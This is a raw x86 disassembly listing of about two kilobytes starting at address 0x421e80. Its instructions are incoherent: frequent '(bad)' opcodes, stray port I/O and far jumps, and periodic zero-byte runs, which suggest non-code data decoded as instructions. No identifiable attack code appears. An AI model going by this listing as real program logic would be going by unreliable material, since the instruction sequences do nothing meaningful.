  421e80:	mov    edi,0x1e87ea15
  421e85:	lea    eax,[ebx+eax*8]
  421e88:	fsubr  DWORD PTR [ebx-0x673ccb5f]
  421e8e:	jb     0x421e67
  421e90:	call   0x5f3db7df
  421e95:	pop    esi
  421e96:	jge    0x421ec7
  421e98:	nop
  421e99:	inc    esp
  421e9a:	xor    BYTE PTR [esi],bl
  421e9c:	sub    BYTE PTR [edx],al
  421e9e:	fnstcw WORD PTR [edi-0x7c]
  421ea1:	or     eax,0xe93ad3c1
  421ea6:	pop    ebp
  421ea7:	push   ebp
  421ea8:	test   ebx,edi
  421eaa:	or     al,ah
  421eac:	pop    eax
  421ead:	xor    DWORD PTR [ecx+0x5b08ae35],0x3a
  421eb4:	fstp   TBYTE PTR ds:0xdd
  421eba:	add    BYTE PTR [eax],al
  421ebc:	add    BYTE PTR [eax],al
  421ebe:	fnstenv [esi-0x2490e49a]
  421ec4:	std    
  421ec5:	neg    BYTE PTR [esi]
  421ec7:	sub    esp,DWORD PTR [ebx-0x23]
  421eca:	jbe    0x421e53
  421ecc:	inc    DWORD PTR [edx+edi*1-0x29]
  421ed0:	add    DWORD PTR [eax],eax
  421ed2:	popa   
  421ed3:	add    BYTE PTR [eax],al
  421ed5:	add    bh,cl
  421ed7:	pop    esp
  421ed8:	pop    esi
  421ed9:	pop    ebp
  421eda:	push   cs
  421edb:	xchg   BYTE PTR [edi],cl
  421edd:	test   bh,al
  421edf:	lods   eax,DWORD PTR ds:[esi]
  421ee0:	mov    cl,BYTE PTR [ebx-0x1997452c]
  421ee6:	sub    esp,ebx
  421ee8:	adc    eax,0x6911ea88
  421eed:	addr16 (bad) 
  421eef:	push   cs
  421ef0:	js     0x421ec5
  421ef2:	dec    eax
  421ef3:	int    0xff
  421ef5:	adc    eax,0x6ecc961e
  421efa:	fisttp QWORD PTR [ebp-0x30]
  421efd:	xor    ah,ch
  421eff:	cmc    
  421f00:	jp     0x421f04
  421f02:	push   ds
  421f03:	ret    0x7f4c
  421f06:	and    al,0x1f
  421f08:	adc    dh,dh
  421f0a:	(bad)  
  421f0b:	cli    
  421f0c:	rol    ecx,1
  421f0e:	sbb    al,0xa7
  421f10:	data16 mov cl,0xdd
  421f13:	call   0x9a695b2b
  421f18:	xchg   ebp,eax
  421f19:	pop    eax
  421f1a:	push   cs
  421f1b:	push   esp
  421f1c:	mov    ch,0xb4
  421f1e:	xor    DWORD PTR [ecx-0x12d65f1e],ecx
  421f24:	sbb    al,0xcb
  421f26:	xchg   ebp,eax
  421f27:	das    
  421f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f29:	test   DWORD PTR [eax],ebx
  421f2b:	fst    QWORD PTR [edi+0x36]
  421f2e:	lea    esi,[edi+0x2ee7f0fa]
  421f34:	dec    eax
  421f35:	fs retf 
  421f37:	add    BYTE PTR [eax],al
  421f39:	add    BYTE PTR [eax],al
  421f3b:	add    BYTE PTR [eax],al
  421f3d:	add    dl,bl
  421f3f:	xor    dl,BYTE PTR [edi-0x20500076]
  421f45:	jb     0x421f4a
  421f47:	inc    ebp
  421f48:	mov    ds:0xc4adc15c,eax
  421f4d:	jmp    0x61:0x1d79b
  421f54:	add    BYTE PTR [eax],al
  421f56:	lods   al,BYTE PTR ds:[esi]
  421f57:	(bad)  
  421f58:	fcom   st(0)
  421f5a:	jns    0x421f22
  421f5c:	ins    DWORD PTR es:[edi],dx
  421f5d:	scas   al,BYTE PTR es:[edi]
  421f5e:	mov    esi,DWORD PTR [eax+0x54dcad73]
  421f64:	cmp    DWORD PTR es:[eax],ecx
  421f67:	data16 jle 0x421f02
  421f6a:	sub    BYTE PTR [ecx],dl
  421f6c:	test   BYTE PTR [edi-0x33aba3ac],0xd2
  421f73:	sahf   
  421f74:	xor    DWORD PTR [ecx+0x1e],edx
  421f77:	jnp    0x421f9f
  421f79:	inc    ebp
  421f7a:	jge    0x421f44
  421f7c:	fst    DWORD PTR [ebx-0x3ca415d3]
  421f82:	mov    DWORD PTR [ebx-0x746862f8],ecx
  421f88:	inc    esi
  421f89:	gs jecxz 0x421f22
  421f8c:	and    eax,0x9ac2412e
  421f91:	leave  
  421f92:	scas   eax,DWORD PTR es:[edi]
  421f93:	in     al,dx
  421f94:	loope  0x422001
  421f96:	(bad)  
  421f97:	out    dx,al
  421f98:	push   edx
  421f99:	cmp    al,0x5a
  421f9b:	add    eax,0xd70c7a85
  421fa0:	mov    esi,0x1a88e94e
  421fa5:	adc    DWORD PTR [edi-0x4435b871],eax
  421fab:	fisubr WORD PTR [ecx]
  421fad:	sub    BYTE PTR [eax-0x1c804b59],0x1a
  421fb4:	xor    al,0xba
  421fb6:	push   edi
  421fb7:	add    BYTE PTR [eax],al
  421fb9:	add    BYTE PTR [eax],al
  421fbb:	add    BYTE PTR [eax],al
  421fbd:	add    BYTE PTR [eax-0x1c],cl
  421fc0:	add    ebx,DWORD PTR [ebx-0x8270051]
  421fc6:	pop    esi
  421fc7:	sub    BYTE PTR [eax-0x506f3f71],bl
  421fcd:	sar    esp,cl
  421fcf:	xlat   BYTE PTR ds:[ebx]
  421fd0:	add    DWORD PTR [eax],eax
  421fd2:	popa   
  421fd3:	add    BYTE PTR [eax],al
  421fd5:	add    BYTE PTR [ebp+0x71],ah
  421fd8:	xchg   edi,eax
  421fd9:	pop    edi
  421fda:	adc    DWORD PTR [esi+0x5e],0xffffffa3
  421fde:	jne    0x422000
  421fe0:	in     eax,dx
  421fe1:	repz add ch,BYTE PTR [ecx+eax*2]
  421fe5:	dec    eax
  421fe6:	cmp    ch,al
  421fe8:	in     al,dx
  421fe9:	(bad)  
  421fea:	in     al,0xff
  421fec:	xlat   BYTE PTR ds:[ebx]
  421fed:	imul   ecx,DWORD PTR [ecx],0xffffffd8
  421ff0:	fimul  WORD PTR [edx+0x490785fe]
  421ff6:	jbe    0x421ff5
  421ff8:	pop    esp
  421ff9:	pop    ebp
  421ffa:	sbb    ax,0xdc4d
  421ffe:	loope  0x421fb2
  422000:	xchg   esp,eax
  422001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422002:	sbb    BYTE PTR [edi-0x6e],ah
  422005:	int    0x8e
  422007:	cs mov esi,ss
  42200a:	psubsw mm2,QWORD PTR [ebx+ecx*1]
  42200e:	pop    ebp
  42200f:	fisttp QWORD PTR fs:[edi+0x42939bb6]
  422016:	mov    ds:0x96a3a3d3,eax
  42201b:	xlat   BYTE PTR ds:[ebx]
  42201c:	rcl    DWORD PTR [esp+ebx*4+0x15],cl
  422020:	arpl   WORD PTR [edi+0x2cf3bee0],cx
  422026:	repnz cwde 
  422028:	sub    bh,bl
  42202a:	or     DWORD PTR [ecx],ebx
  42202c:	or     dh,BYTE PTR [eax-0x423d0c6e]
  422032:	jb     0x422078
  422034:	push   ebx
  422035:	adc    BYTE PTR [eax+eax*1],dl
  422038:	add    BYTE PTR [eax],al
  42203a:	add    BYTE PTR [eax],al
  42203c:	add    BYTE PTR [eax],al
  42203e:	push   edx
  42203f:	add    al,0xa2
  422041:	xor    dh,0xa6
  422044:	jb     0x42201a
  422046:	ins    DWORD PTR es:[edi],dx
  422047:	xor    dh,BYTE PTR [edx]
  422049:	and    eax,0x2d918d68
  42204e:	pop    ebp
  42204f:	fadd   DWORD PTR [ecx]
  422051:	add    BYTE PTR [ecx+0x0],ah
  422054:	add    BYTE PTR [eax],al
  422056:	icebp  
  422057:	pushf  
  422058:	mov    edx,0x2dd215a9
  42205d:	aaa    
  42205e:	scas   al,BYTE PTR es:[edi]
  42205f:	mov    ah,0x17
  422061:	nop
  422062:	mov    ch,0xdd
  422064:	mov    cs,WORD PTR [ebp-0x3]
  422067:	nop
  422068:	push   es
  422069:	mov    eax,ds:0xe5b21bd2
  42206e:	and    eax,0xf1f5cb3f
  422073:	(bad)  
  422074:	lock dec ebx
  422076:	pop    ebp
  422077:	dec    esp
  422078:	in     eax,dx
  422079:	xchg   esi,eax
  42207a:	ds dec edi
  42207c:	xor    al,0x9d
  42207e:	loopne 0x422005
  422080:	inc    edx
  422081:	dec    ebp
  422082:	push   ebp
  422083:	sub    esi,esp
  422085:	stos   DWORD PTR es:[edi],eax
  422086:	mov    al,ds:0xf596f7f8
  42208b:	pop    edi
  42208c:	add    BYTE PTR [eax],dh
  42208e:	repz in eax,0x98
  422091:	dec    esp
  422092:	daa    
  422093:	sub    BYTE PTR [esp+esi*4],0x46
  422097:	push   0xc67ed1a1
  42209c:	arpl   WORD PTR [eax-0x17],bp
  42209f:	xor    DWORD PTR [edx],ecx
  4220a1:	mov    ch,0xbc
  4220a3:	out    0xb9,eax
  4220a5:	adc    DWORD PTR [edi-0x6089a0a5],esi
  4220ab:	push   esp
  4220ac:	mov    edi,0xa4c1711f
  4220b1:	test   esp,ebx
  4220b3:	pop    ds
  4220b4:	mov    WORD PTR [esi+edx*2+0x0],gs
  4220bb:	add    BYTE PTR [eax],al
  4220bd:	add    BYTE PTR [eax],bh
  4220bf:	push   0xffffff96
  4220c1:	add    edx,esi
  4220c3:	(bad)  
  4220c4:	mov    ebp,0xdb4ef67b
  4220c9:	out    0x47,eax
  4220cb:	inc    esp
  4220cc:	repnz in eax,0xbe
  4220cf:	fadd   DWORD PTR [ecx]
  4220d1:	add    BYTE PTR [ecx+0x0],ah
  4220d4:	add    BYTE PTR [eax],al
  4220d6:	sub    esp,edi
  4220d8:	jnp    0x422060
  4220da:	ins    DWORD PTR es:[edi],dx
  4220db:	(bad)  
  4220dc:	mov    DWORD PTR [ebx+0x12ba57ac],esi
  4220e2:	lahf   
  4220e3:	cmp    eax,0x9669c4ee
  4220e8:	imul   edx,DWORD PTR [edi],0x1c
  4220eb:	or     BYTE PTR [ecx+0x7b],dl
  4220ee:	jo     0x422084
  4220f0:	int    0x30
  4220f2:	dec    ecx
  4220f3:	cmp    al,0x91
  4220f5:	(bad)  
  4220f6:	mov    ds:0x492a8d44,eax
  4220fb:	dec    eax
  4220fc:	cmc    
  4220fd:	test   DWORD PTR [eax+0x10],esi
  422100:	xchg   edi,eax
  422101:	push   cs
  422102:	syscall 
  422104:	std    
  422105:	neg    DWORD PTR [edx+0x27]
  422108:	stc    
  422109:	lds    ebp,FWORD PTR [edi-0xa]
  42210c:	jmp    0x422115
  42210e:	fcom   DWORD PTR [ebp+0x7b]
  422111:	push   es
  422112:	mov    edi,0xca4c97c9
  422117:	xchg   ebp,eax
  422118:	jne    0x42217f
  42211a:	in     al,dx
  42211b:	pop    esi
  42211c:	jmp    0x422155
  42211e:	dec    ecx
  42211f:	fs aaa 
  422121:	add    cl,BYTE PTR [ebp+0x19]
  422124:	mov    DWORD PTR [ebp-0x9],edx
  422127:	pop    esi
  422128:	ss push esi
  42212a:	xor    bh,ah
  42212c:	mov    gs,WORD PTR [ebx+0x74]
  42212f:	scas   al,BYTE PTR es:[edi]
  422130:	and    cl,BYTE PTR [eax]
  422132:	test   eax,0xbf4e9a58
  422137:	add    BYTE PTR [eax],al
  422139:	add    BYTE PTR [eax],al
  42213b:	add    BYTE PTR [eax],al
  42213d:	add    cl,ch
  42213f:	mov    ecx,0xf37a307a
  422144:	jmp    0x42213f
  422146:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42214a:	es fcmovnb st,st(1)
  42214d:	cld    
  42214e:	pop    ds
  42214f:	fld    DWORD PTR [ecx]
  422151:	add    BYTE PTR [ecx+0x0],ah
  422154:	add    BYTE PTR [eax],al
  422156:	xor    cl,BYTE PTR [edi]
  422158:	jno    0x422161
  42215a:	es test eax,0x7deeb4da
  422160:	jmp    0x422134
  422162:	fbld   TBYTE PTR [ebx+0x26]
  422165:	std    
  422166:	xor    DWORD PTR [esi],0xffffffbc
  422169:	mov    BYTE PTR [edi-0x3fd4cd88],ch
  42216f:	leave  
  422170:	pop    esi
  422171:	nop
  422172:	or     BYTE PTR [edx+edi*4-0x766fb859],dl
  422179:	int3   
  42217a:	es xor ecx,esi
  42217d:	into   
  42217e:	in     eax,dx
  42217f:	fisttp DWORD PTR [ecx]
  422181:	xchg   esi,eax
  422182:	popf   
  422183:	mov    dh,al
  422185:	sub    al,0x80
  422187:	and    al,0x58
  422189:	stc    
  42218a:	xchg   ecx,eax
  42218b:	cmp    al,0x89
  42218d:	jmp    0x87dde685
  422192:	or     eax,0xc89197df
  422197:	dec    eax
  422198:	loope  0x42213c
  42219a:	xlat   BYTE PTR ds:[ebx]
  42219b:	dec    ebx
  42219c:	sub    BYTE PTR ss:[esi+edi*2],dh
  4221a0:	jne    0x4221cf
  4221a2:	outs   dx,BYTE PTR ds:[esi]
  4221a3:	mov    ah,0xe5
  4221a5:	jb     0x4221eb
  4221a7:	xchg   esp,eax
  4221a8:	xchg   edi,eax
  4221a9:	jno    0x4221f5
  4221ab:	fimul  WORD PTR [ecx-0x3b]
  4221ae:	scas   eax,DWORD PTR es:[edi]
  4221af:	addr16 pop edi
  4221b1:	scas   eax,DWORD PTR es:[edi]
  4221b2:	ins    DWORD PTR es:[edi],dx
  4221b3:	xchg   edi,eax
  4221b4:	pop    edi
  4221b5:	jnp    0x422228
  4221b7:	add    BYTE PTR [eax],al
  4221b9:	add    BYTE PTR [eax],al
  4221bb:	add    BYTE PTR [eax],al
  4221bd:	add    BYTE PTR [ebx+0x41],bl
  4221c0:	pop    ebx
  4221c1:	iret   
  4221c2:	pop    ebx
  4221c3:	(bad)  
  4221c5:	aad    0xf
  4221c7:	ss dec esp
  4221c9:	dec    esi
  4221ca:	int3   
  4221cb:	and    ebp,DWORD PTR [ecx+0x1f]
  4221ce:	sbb    cl,0x1
  4221d1:	add    BYTE PTR [ecx+0x0],ah
  4221d4:	add    BYTE PTR [eax],al
  4221d6:	mov    ebp,0xbce731ec
  4221db:	stos   BYTE PTR es:[edi],al
  4221dc:	jbe    0x4221fd
  4221de:	dec    ebp
  4221df:	sub    eax,0xecacb647
  4221e4:	scas   eax,DWORD PTR es:[edi]
  4221e5:	popf   
  4221e6:	pushf  
  4221e7:	jge    0x42217b
  4221e9:	shl    BYTE PTR [ebx],1
  4221eb:	out    0x95,eax
  4221ed:	inc    esp
  4221ee:	add    BYTE PTR [ecx],cl
  4221f0:	mov    dl,0xa5
  4221f2:	in     al,dx
  4221f3:	mov    ah,0x8
  4221f5:	push   ds
  4221f6:	ins    DWORD PTR es:[edi],dx
  4221f7:	cmp    DWORD PTR [edx+0x61cc80b],esp
  4221fd:	inc    edi
  4221fe:	dec    esp
  4221ff:	inc    eax
  422200:	cmp    esi,DWORD PTR [ecx]
  422202:	fwait
  422203:	mov    ebx,0x928fb38a
  422208:	push   ss
  422209:	(bad)  
  42220a:	pop    edi
  42220b:	iret   
  42220c:	sar    DWORD PTR [edi],cl
  42220e:	and    al,0x66
  422210:	leave  
  422211:	and    al,0xe2
  422213:	mov    ebx,0x3221bcac
  422218:	push   esi
  422219:	arpl   WORD PTR [ebx],bp
  42221b:	lock out 0x9f,eax
  42221e:	shl    edi,0xaa
  422221:	stos   BYTE PTR es:[edi],al
  422222:	test   DWORD PTR [ebx],eax
  422224:	call   0x32f783b0
  422229:	sub    ebx,ecx
  42222b:	aas    
  42222c:	push   0xdf86a0c0
  422231:	sub    DWORD PTR [edx-0x229ad20f],edx
  422237:	add    BYTE PTR [eax],al
  422239:	add    BYTE PTR [eax],al
  42223b:	add    BYTE PTR [eax],al
  42223d:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422243:	cld    
  422244:	(bad)  [edi-0x65be08a1]
  42224a:	les    eax,FWORD PTR [edi+eiz*1+0x1d9e19f]
  422251:	add    BYTE PTR [ecx+0x0],ah
  422254:	add    BYTE PTR [eax],al
  422256:	cmp    dl,dl
  422258:	addr16 push 0xffffffed
  42225b:	mov    ecx,0x5867e6ad
  422260:	pop    ebx
  422261:	adc    dl,BYTE PTR [edi]
  422263:	jp     0x422244
  422265:	int    0x88
  422267:	jno    0x422286
  422269:	loopne 0x4222bf
  42226b:	fld    QWORD PTR [ecx-0x19]
  42226e:	rol    BYTE PTR ds:0xd2c64788,cl
  422274:	in     al,dx
  422275:	dec    esi
  422276:	ret    
  422277:	mov    al,0xb8
  422279:	adc    dl,al
  42227b:	mov    edi,0xfdb4b743
  422280:	icebp  
  422281:	sub    al,BYTE PTR ds:0xf557239
  422287:	inc    eax
  422288:	icebp  
  422289:	sahf   
  42228a:	jecxz  0x42220c
  42228c:	cmp    BYTE PTR [edi+0xc],dl
  42228f:	fisubr WORD PTR [ecx+esi*1+0x4f]
  422293:	aas    
  422294:	and    DWORD PTR [eax],edx
  422296:	sub    cl,BYTE PTR [ecx]
  422298:	add    eax,0xeb78eadb
  42229d:	cmp    DWORD PTR [ebp-0x17e5708c],0x6b
  4222a4:	int3   
  4222a5:	call   0x4dfe7804
  4222aa:	ja     0x42222d
  4222ac:	aas    
  4222ad:	clc    
  4222ae:	sar    DWORD PTR [edx-0x34],cl
  4222b1:	(bad)  
  4222b2:	mov    eax,0x301569ae
  4222b7:	add    BYTE PTR [eax],al
  4222b9:	add    BYTE PTR [eax],al
  4222bb:	add    BYTE PTR [eax],al
  4222bd:	add    BYTE PTR [esi+0x73],ch
  4222c0:	lock retf 0xcbfd
  4222c4:	jle    0x4222bd
  4222c6:	repz xor eax,0xce618ce9
  4222cc:	mov    edx,0x1da4249
  4222d1:	add    BYTE PTR [ecx+0x0],ah
  4222d4:	add    BYTE PTR [eax],al
  4222d6:	test   BYTE PTR [edi],dh
  4222d8:	cmp    ah,BYTE PTR [ebp-0x636a9b21]
  4222de:	push   eax
  4222df:	xor    al,BYTE PTR [ebp-0x3d9a5689]
  4222e5:	test   BYTE PTR [edx-0x2a],dl
  4222e8:	mov    edi,DWORD PTR [ebp-0x7c25cde]
  4222ee:	call   0x791f:0xc287b329
  4222f5:	hlt    
  4222f6:	nop
  4222f7:	adc    ch,BYTE PTR [eax+0x3c]
  4222fa:	mov    bl,0xf2
  4222fc:	pop    dx
  4222fe:	fidiv  DWORD PTR [edx+edi*4-0x3f]
  422302:	imul   edi,DWORD PTR [esi+0xf73f0be],0x17
  422309:	push   ecx
  42230a:	mov    ah,0xba
  42230c:	inc    edx
  42230d:	and    BYTE PTR [edx],bh
  42230f:	mov    dl,0xe8
  422311:	repz aam 0xa3
  422314:	adc    bh,bl
  422316:	imul   ecx,DWORD PTR [ebx+0x565a0c7d],0xffffffbd
  42231d:	xor    eax,0x8b666deb
  422322:	out    dx,al
  422323:	call   0xae35360e
  422328:	sbb    al,0xa1
  42232a:	pop    esp
  42232b:	(bad)  
  42232c:	aas    
  42232d:	cld    
  42232e:	stc    
  42232f:	mov    ch,0x6d
  422331:	ss inc ebp
  422333:	outs   dx,DWORD PTR ds:[esi]
  422334:	dec    ebp
  422335:	out    0xcc,eax
  422337:	add    BYTE PTR [eax],al
  422339:	add    BYTE PTR [eax],al
  42233b:	add    BYTE PTR [eax],al
  42233d:	add    ch,dh
  42233f:	adc    al,0xae
  422341:	adc    ebp,edi
  422343:	mov    ebx,0x84e6f6fd
  422348:	lds    ebp,FWORD PTR [edx+0x6e22d2e1]
  42234e:	mov    ds:0x610001da,eax
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [esi],cl
  422357:	jecxz  0x4222da
  422359:	loopne 0x4223a4
  42235b:	xor    cl,dl
  42235d:	sub    BYTE PTR [esi-0x7169d3a6],al
  422363:	arpl   WORD PTR [ebp-0x6440d093],sp
  422369:	(bad)  
  42236a:	enter  0x8096,0x56
  42236e:	push   esi
  42236f:	adc    edx,DWORD PTR [ecx]
  422371:	sbb    BYTE PTR [edi-0x42],al
  422374:	es jbe 0x422348
  422377:	ja     0x422335
  422379:	les    edx,FWORD PTR [esi]
  42237b:	sti    
  42237c:	jg     0x422364
  42237e:	sub    edi,DWORD PTR [eax+0x666884aa]
  422384:	xor    al,0x53
  422386:	outs   dx,DWORD PTR ds:[esi]
  422387:	dec    eax
  422388:	(bad)  
  422389:	xchg   ecx,eax
  42238a:	xor    ch,cl
  42238c:	icebp  
  42238d:	xchg   esi,eax
  42238e:	mov    ds:0x48134162,eax
  422393:	(bad)  
  422394:	mul    DWORD PTR [ecx]
  422396:	imul   edx,DWORD PTR [ecx+0x18781af],0x7bd5e1b6
  4223a0:	mov    DWORD PTR [esi-0x7b],0xfa1ac118
  4223a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223a8:	mov    ebx,0xbb45e7d7
  4223ad:	dec    esi
  4223ae:	dec    edx
  4223af:	sbb    esi,DWORD PTR [edx-0x31]
  4223b2:	mov    bh,0xd9
  4223b4:	(bad)  
  4223b5:	lods   eax,DWORD PTR ds:[esi]
  4223b6:	push   eax
  4223b7:	add    BYTE PTR [eax],al
  4223b9:	add    BYTE PTR [eax],al
  4223bb:	add    BYTE PTR [eax],al
  4223bd:	add    BYTE PTR [ebx],bh
  4223bf:	mov    cl,0x57
  4223c1:	lock fcomip st,st(6)
  4223c4:	mov    edi,0xbb1c16fb
  4223c9:	shl    BYTE PTR [edx],0xee
  4223cc:	pop    eax
  4223cd:	mov    ecx,0x1db04
  4223d2:	popa   
  4223d3:	add    BYTE PTR [eax],al
  4223d5:	add    BYTE PTR [ebp-0xa],ch
  4223d8:	xchg   ecx,eax
  4223d9:	push   ss
  4223da:	add    eax,0x9bac08bb
  4223df:	mov    ebx,0x8985bb5a
  4223e4:	dec    edi
  4223e5:	pop    edx
  4223e6:	mov    ecx,0x5bc4223f
  4223eb:	cmp    al,0x9f
  4223ed:	jno    0x422428
  4223ef:	fwait
  4223f0:	sbb    DWORD PTR [esi],0x2500e910
  4223f6:	xchg   esp,eax
  4223f7:	add    DWORD PTR [edx],esp
  4223f9:	daa    
  4223fa:	popf   
  4223fb:	jmp    0xe941:0x51ece4a3
  422402:	out    0x73,al
  422404:	repz jmp 0xd4fd:0x105f8985
  42240c:	adc    al,0xaa
  42240e:	out    0x5e,eax
  422410:	dec    edx
  422411:	mov    dl,0x84
  422413:	cdq    
  422414:	(bad)  
  422416:	ds dec edi
  422418:	(bad)  
  42241a:	gs add edi,eax
  42241d:	mov    esp,0x824f4bd8
  422422:	lds    esp,FWORD PTR [edi+edi*2]
  422425:	test   ebp,esp
  422427:	shr    BYTE PTR ds:0x1a85be43,0xb8
  42242e:	popa   
  42242f:	fwait
  422430:	inc    esi
  422431:	push   eax
  422432:	pop    ebp
  422433:	fcmovnu st,st(5)
  422435:	dec    BYTE PTR [esi]
  422437:	add    BYTE PTR [eax],al
  422439:	add    BYTE PTR [eax],al
  42243b:	add    BYTE PTR [eax],al
  42243d:	add    ah,dl
  42243f:	sqrtps xmm6,xmm0
  422442:	(bad)  
  422444:	cmc    
  422445:	das    
  422446:	sbb    BYTE PTR [eax],cl
  422448:	xchg   ebx,eax
  422449:	iret   
  42244a:	sti    
  42244b:	push   ecx
  42244c:	call   0x6100:0x1db6507
  422453:	add    BYTE PTR [eax],al
  422455:	add    BYTE PTR [esi+0x7b840911],bh
  42245b:	dec    ebp
  42245c:	mov    DWORD PTR [ebp-0x36],ebx
  42245f:	dec    edi
  422460:	jno    0x4223eb
  422462:	inc    eax
  422463:	mov    ds:0x830db87c,eax
  422468:	mov    dh,0x47
  42246a:	call   0xbfd91c61
  42246f:	inc    ebp
  422470:	shl    BYTE PTR [ebx+ebp*2-0x68bd08d7],0x99
  422478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422479:	daa    
  42247a:	hlt    
  42247b:	retf   0xf624
  42247e:	cli    
  42247f:	rcl    BYTE PTR [ebx-0xd],cl
  422482:	mov    bl,0x6
  422484:	jp     0x4224ab
  422486:	daa    
  422487:	cli    
  422488:	into   
  422489:	call   0x45b0:0x7e509014
  422490:	(bad)  
  422491:	jbe    0x42244d
  422493:	xchg   ah,bh
  422495:	idiv   BYTE PTR [ebx+0x23]
  422498:	and    dh,cl
  42249a:	call   0xbc6c:0x58aacce9
  4224a1:	jecxz  0x42251b
  4224a3:	and    DWORD PTR [ecx+0x3eec25f6],edx
  4224a9:	xor    ebx,ebx
  4224ab:	out    0x55,eax
  4224ad:	inc    ebx
  4224ae:	adc    bh,BYTE PTR [eax]
  4224b0:	call   0xdbce:0x9c0a9734
  4224b7:	add    BYTE PTR [eax],al
  4224b9:	add    BYTE PTR [eax],al
  4224bb:	add    BYTE PTR [eax],al
  4224bd:	add    ch,cl
  4224bf:	sub    eax,0xfbf54395
  4224c4:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4224ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224cb:	call   0x1:0xdbc63083
  4224d2:	popa   
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx+0x461f7eaf],bl
  4224db:	xchg   esp,eax
  4224dc:	shl    dl,0x3e
  4224df:	das    
  4224e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e1:	dec    ecx
  4224e2:	xor    eax,0xec0bd1f0
  4224e7:	fcomp  st(6)
  4224e9:	and    DWORD PTR [edx],ecx
  4224eb:	pop    ebx
  4224ec:	test   eax,0xcb934d42
  4224f1:	in     al,0x6b
  4224f3:	pop    esp
  4224f4:	xchg   ebx,eax
  4224f5:	bound  ecx,QWORD PTR ds:[edx+ebp*1]
  4224f9:	shl    BYTE PTR [eax-0x74],1
  4224fc:	push   ebx
  4224fd:	jmp    0x4224be
  4224ff:	inc    edx
  422500:	lahf   
  422501:	cwde   
  422502:	ss pusha 
  422504:	push   edx
  422505:	xor    eax,0x3fef05c9
  42250a:	clc    
  42250b:	das    
  42250c:	xchg   edi,eax
  42250d:	dec    ebx
  42250e:	cmp    al,bh
  422510:	jmp    0x12e0:0xaccb0a5
  422517:	icebp  
  422518:	std    
  422519:	sub    edx,DWORD PTR [ebx-0x6c]
  42251c:	add    eax,0x58d61f1a
  422521:	xchg   edx,eax
  422522:	and    eax,0x9ee0fe0c
  422527:	jnp    0x4224eb
  422529:	shr    DWORD PTR [eax+0x2f],1
  42252c:	sbb    eax,0x5c25c96f
  422531:	std    
  422532:	fimul  WORD PTR [edi+0x3b]
  422535:	imul   eax,DWORD PTR [edi+0x0],0x13000000
  42253f:	fs out 0xb,eax
  422542:	test   DWORD PTR [ebx-0xce58301],0x10be4cfc
  42254c:	push   es
  42254d:	outs   dx,BYTE PTR ds:[esi]
  42254e:	daa    
  42254f:	fadd   QWORD PTR [ecx]
  422551:	add    BYTE PTR [ecx+0x0],ah
  422554:	add    BYTE PTR [eax],al
  422556:	push   cs
  422557:	cmp    bh,ch
  422559:	aas    
  42255a:	lods   al,BYTE PTR ds:[esi]
  42255b:	fisttp WORD PTR [eax-0x42e23d1c]
  422561:	mov    eax,0xe09eeff2
  422566:	mov    cl,BYTE PTR [ebx-0x5a]
  422569:	or     edx,DWORD PTR [edi+0x7f4251eb]
  42256f:	sub    al,0xe
  422571:	jnp    0x4224fe
  422573:	jbe    0x4225bf
  422575:	icebp  
  422576:	pushf  
  422577:	jno    0x4225df
  422579:	setae  BYTE PTR [ecx+0x59cdeeb0]
  422580:	cs retf 0x1b8
  422584:	ret    
  422585:	sbb    ch,BYTE PTR [ebx-0x5ab6efc7]
  42258b:	push   ss
  42258c:	fsubr  QWORD PTR [esp+esi*1+0x3]
  422590:	arpl   WORD PTR [ecx-0x57ab14c9],bp
  422596:	lods   al,BYTE PTR ds:[esi]
  422597:	repnz push esi
  422599:	mov    ds:0xe328ad9c,al
  42259e:	inc    esi
  42259f:	jge    0x4225cf
  4225a1:	(bad)  
  4225a2:	push   esi
  4225a3:	xchg   DWORD PTR [esi+ebx*2],ebp
  4225a6:	xchg   BYTE PTR [esi-0x44],dh
  4225a9:	rcl    DWORD PTR [edi-0x4a],0x23
  4225ad:	in     eax,dx
  4225ae:	scas   al,BYTE PTR es:[edi]
  4225af:	aas    
  4225b0:	add    ah,dl
  4225b2:	sbb    al,ah
  4225b4:	loope  0x42258d
  4225b6:	cmp    BYTE PTR [eax],al
  4225b8:	add    BYTE PTR [eax],al
  4225ba:	add    BYTE PTR [eax],al
  4225bc:	add    BYTE PTR [eax],al
  4225be:	add    dl,BYTE PTR ss:[ebp+0xc]
  4225c2:	jne    0x422623
  4225c4:	jg     0x422600
  4225c6:	clc    
  4225c7:	cs aas 
  4225c9:	push   0x5916d156
  4225ce:	in     al,0xce
  4225d0:	add    DWORD PTR [eax],eax
  4225d2:	popa   
  4225d3:	add    BYTE PTR [eax],al
  4225d5:	add    BYTE PTR [ecx-0xc64f097],cl
  4225db:	xor    al,0xda
  4225dd:	push   esi
  4225de:	in     eax,dx
  4225df:	data16 cli 
  4225e1:	jo     0x422609
  4225e3:	lock ss pop ebp
  4225e6:	int    0xc2
  4225e8:	call   0xdc4b:0xb0101d13
  4225ef:	out    dx,eax
  4225f0:	mov    ch,0x9d
  4225f2:	dec    esp
  4225f3:	sar    edi,1
  4225f5:	sbb    dh,ch
  4225f7:	push   ebp
  4225f8:	add    DWORD PTR ds:0xd1d66844,0x49
  4225ff:	and    dh,ah
  422601:	rcl    BYTE PTR [eax-0x4d],0x81
  422605:	loopne 0x422621
  422607:	inc    esi
  422608:	shl    BYTE PTR ds:0x12ff6681,cl
  42260e:	jle    0x422635
  422610:	out    0x70,eax
  422612:	push   0x32
  422614:	fidivr WORD PTR [edx]
  422616:	test   BYTE PTR [edx+0x6a2bb9c9],bl
  42261c:	mov    ds:0x982b0da3,al
  422621:	pop    esi
  422622:	mov    edx,0x17812e25
  422627:	push   edx
  422628:	or     al,0xf9
  42262a:	inc    edi
  42262b:	push   esi
  42262c:	aam    0xc9
  42262e:	xor    eax,DWORD PTR [edi+0x6c]
  422631:	and    al,0x68
  422633:	fimul  WORD PTR [edi+0x7c04]
  422639:	add    BYTE PTR [eax],al
  42263b:	add    BYTE PTR [eax],al
